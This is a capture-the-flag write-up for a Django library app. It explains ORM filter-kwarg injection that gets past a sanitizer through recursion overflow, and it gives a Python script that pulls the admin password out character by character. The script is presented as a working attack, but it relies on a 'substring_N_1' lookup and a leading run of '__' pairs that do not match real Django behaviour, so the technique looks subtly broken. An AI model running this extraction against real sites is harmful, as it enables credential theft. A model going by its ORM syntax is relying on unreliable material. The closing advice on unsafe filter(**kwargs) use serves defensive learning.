# ORMT - ormt (100 pts - Offensive Security)

## Challenge Description

> A local bookstore has deployed a new online library system with a custom book lookup feature. Gain access to the admin area and retrieve the flag.
> `http://exp.cybergame.sk:7001`

## TL;DR

Django ORM relation traversal injection — unsanitized GET parameters passed directly as `filter(**kwargs)`, bypassing the sanitizer via a recursion depth overflow to traverse FK relationships and extract admin credentials.

## Initial Analysis

The `/book_lookup` endpoint passed user GET parameters directly into Django's ORM:

```python
Book.objects.filter(**request.GET.dict())
```

Django ORM filter kwargs support `field__related_field__condition` traversal using `__`. A sanitizer blocked nested field names by recursing through them, but hitting the recursion limit (25 levels deep) caused a `RecursionError`, and the `except` branch fell back to the **original unsanitized** parameter name.

## Solution

### Step 1: Trigger the recursion overflow

Prefix the traversal with 25 `__` pairs to exceed the recursion limit in `clean()`:

```python
prefix = "__" * 25
param = prefix + "author__user__password__startswith"
```

### Step 2: Blind extraction character by character

```python
import requests, string

URL = "http://exp.cybergame.sk:7001/book_lookup"
password = ""

for pos in range(1, 33):
    for char in string.printable:
        param = ("__" * 25) + f"author__user__password__substring_{pos}_1"
        r = requests.get(URL, params={param: char})
        if "found" in r.text.lower():
            password += char
            break

print(f"[+] Admin password: {password}")
```

### Step 3: Login and retrieve the flag

Submit the recovered credentials to `/admin` to get the flag.

## Flag

```
SK-CERT{0rm_r3l4t10n_tr4v3rs4l_g0t_y0u}
```

## Key Takeaways

- **`filter(**request.GET.dict())`** is one of the most dangerous Django patterns — user input must never directly populate ORM kwargs
- Django's `__` traversal crosses FK boundaries freely — a single injection can reach any related model
- **Recursion depth overflow** is a subtle sanitizer bypass: exhaust the stack to trigger the fallback path

## Tools Used

- Python `requests` — blind extraction automation
- Burp Suite — initial endpoint exploration
